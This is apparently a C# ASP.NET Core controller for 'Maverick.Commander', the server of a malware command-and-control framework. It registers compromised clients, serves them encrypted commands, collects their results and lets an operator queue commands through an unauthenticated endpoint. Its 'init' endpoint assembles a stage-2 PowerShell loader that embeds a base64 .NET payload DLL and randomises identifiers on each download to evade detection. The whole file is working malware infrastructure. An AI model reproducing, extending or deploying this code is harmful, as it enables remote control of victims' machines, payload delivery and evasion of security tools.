using Maverick.Commander.Services;
using Maverick.Models;
using Maverick.Models.Command;
using Maverick.Utility;
using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Mvc;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;

#pragma warning disable IDE0290

namespace Maverick.Commander.Controllers
{
    [ApiController]
    [Route("api")]
    public class CommandController : ControllerBase
    {
        private readonly IWebHostEnvironment _webHostEnvironment;
        private readonly ICommandAndControl _commandAndControl;
        private readonly string HeaderHashCheck;
        private readonly JsonSerializerOptions options = new()
        {
            PropertyNameCaseInsensitive = true 
        };

        public CommandController(IWebHostEnvironment webHostEnvironment, ICommandAndControl commandAndControl)
        {
            _webHostEnvironment = webHostEnvironment;
            _commandAndControl = commandAndControl;
            HeaderHashCheck = Crypto.GetHash(Key.SecretKey);
        }

        private bool IsValidRequest()
        {
            if (!Request.Headers.TryGetValue("X-Request-Hash", out var receivedHash))
            {
                return false;
            }
            return receivedHash == HeaderHashCheck;
        }

        [HttpPost("get")]
        public async Task<IActionResult> ClientRequestCommand()
        {
            if (!IsValidRequest())
                return Unauthorized();

            using var ms = new MemoryStream();
            await Request.Body.CopyToAsync(ms);
            var rawBody = ms.ToArray();
            if (rawBody.Length != 4)
                return Ok(0);

            int ClientId = BitConverter.ToInt32(rawBody, 0);
            if (!_commandAndControl.ValidListClientID(ClientId))
                return Ok(0xffffffff);

            var command = _commandAndControl.GetCommandForClient(ClientId);
            if (command == null)
                return Ok();

            var encryptedCommand = await Crypto.EncryptAESPayload(Encoding.UTF8.GetBytes(JsonSerializer.Serialize(command)));
            _commandAndControl.ClearCommand(command.CommandID);
            return File(encryptedCommand, "application/octet-stream");
        }

        [HttpPost("post")]
        public async Task<IActionResult> ClientRequestResult()
        {
            if (!IsValidRequest())
                return Unauthorized();

            using var ms = new MemoryStream();
            await Request.Body.CopyToAsync(ms);
            var encryptedData = ms.ToArray();

            var rawBody = await Crypto.DecryptAESPayload(encryptedData);
            var json = Encoding.UTF8.GetString(rawBody);
            var commandResult = JsonSerializer.Deserialize<CommandRequestModel>(json);
            if (commandResult == null)
                return BadRequest();

            await _commandAndControl.UpdateCommand(commandResult);
            return Ok();
        }

        [HttpPost("new")]
        public async Task<IActionResult> ClientNewConnect()
        {
            if (!IsValidRequest())
                return Unauthorized();
            using var ms = new MemoryStream();
            await Request.Body.CopyToAsync(ms);
            var encryptedData = ms.ToArray();

            var rawBody = await Crypto.DecryptAESPayload(encryptedData);
            var json = Encoding.UTF8.GetString(rawBody);
            var newClientInfo = JsonSerializer.Deserialize<InfoClientModel>(json);
            if (newClientInfo == null)
                return BadRequest();

            int newClientId = newClientInfo.InternalID;
            if (newClientId == 0)
            {
                newClientId = _commandAndControl.GenerateNewClientID();
                newClientInfo.InternalID = newClientId;
            }
            if (!_commandAndControl.ValidListClientID(newClientId))
            {
                _commandAndControl.UpdateNewClient(newClientInfo);
            }
            return Ok(newClientId);
        }

        [HttpPost("send")]
        public async Task<IActionResult> SendCommand()
        {
            using var reader = new StreamReader(Request.Body);
            var body = await reader.ReadToEndAsync();

            if (string.IsNullOrEmpty(body))
            {
                return BadRequest("Empty request body");
            }
            CommandRequestModel? cmd;
            try
            {
                
                cmd = JsonSerializer.Deserialize<CommandRequestModel>(body, options);
            }
            catch (JsonException ex)
            {
                return BadRequest("Invalid JSON format: " + ex.Message);
            }

            if (cmd == null)
            {
                return BadRequest("Invalid request data");
            }

            if (!_commandAndControl.ValidListClientID(cmd.InternalID))
                return BadRequest("Invalid client");

            // Cập nhật command queue để client poll lấy
            cmd.CommandID = Random.Shared.Next();
            _commandAndControl.AddCommandQueue(cmd);

            // Lưu lịch sử
            await _commandAndControl.UpdateCommand(cmd);

            return Ok(new { ok = true });
        }

        [HttpGet("init/{cus_hash}")]
        public async Task<IActionResult> InitLoader(string cus_hash)
        {
            if (cus_hash != HeaderHashCheck)
            {
                return Unauthorized();
            }

            var payload_path = Path.Combine(_webHostEnvironment.WebRootPath, "payload");
            var net_loader = await System.IO.File.ReadAllBytesAsync(Path.Combine(payload_path, "Maverick.Load.dll"));//template
            var newtonsoft_dll = await System.IO.File.ReadAllBytesAsync(Path.Combine(payload_path, "Newtonsoft.Json.dll"));
            var template = await System.IO.File.ReadAllTextAsync(Path.Combine(payload_path, "Raw_Stage2.ps1"));
            template = template.Replace("__PAYLOAD_B64__", Convert.ToBase64String(net_loader));
            template = template.Replace("__DLL_NEWTONSOFT_B64__", Convert.ToBase64String(newtonsoft_dll));

            var tokens = GenerateCode.FindTokens(template);
            if (tokens == null) return NoContent();
            HashSet<string> generated = [];
            foreach (var t in tokens)
            {
                template = template.Replace(t, GenerateCode.GenerateRandomString(generated));
            }
            return Content(template, "text/plain");
        }
    }
}
